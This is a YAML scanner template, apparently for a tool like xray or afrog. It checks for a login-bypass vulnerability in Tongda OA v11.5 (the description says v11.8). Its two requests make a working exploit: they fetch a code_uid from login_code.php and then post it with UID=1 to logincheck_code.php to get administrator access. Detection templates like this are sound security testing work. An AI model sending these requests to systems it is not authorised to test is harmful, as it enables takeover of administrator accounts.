id: tongda-logincheck-code-getcookie

info:
  name: 通达OA v11.5 logincheck_code.php 登陆绕过漏洞
  author: zan8in
  severity: critical
  description: |
    通达OA v11.8 logincheck_code.php存在登陆绕过漏洞，通过漏洞攻击者可以登陆系统管理员后台
    app="TDXK-通达OA"
  reference:
    - http://wiki.peiqi.tech/wiki/oa/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%20v11.5%20logincheck_code.php%20%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E.html
    - https://mp.weixin.qq.com/s/7723ZW4-19JvqmMAVS4pcw

rules:
  r0:
    request:
      method: GET
      path: //general/login_code.php
      headers:
         Accept-Encoding: gzip, deflate
         Connection: keep-alive
    expression: response.status == 200 && response.body.bcontains(b'"code_uid":')
    output:
        search: '"\"code_uid\":\"{(?P<codeuid>.*?)}\"".bsubmatch(response.body)'
        codeuid: search["codeuid"]
  r1:
    request:
      method: POST
      path: //logincheck_code.php
      body: |
        CODEUID=%7B{{codeuid}}%7D&UID=1
    expression: "true"
#response.status == 200 && response.body.bcontains(b'"status":')  && response.body.bcontains(b'"msg":') && response.body.bcontains(b'"url":') && response.body.bcontains(b'index.php?isIE=0')
expression: r0()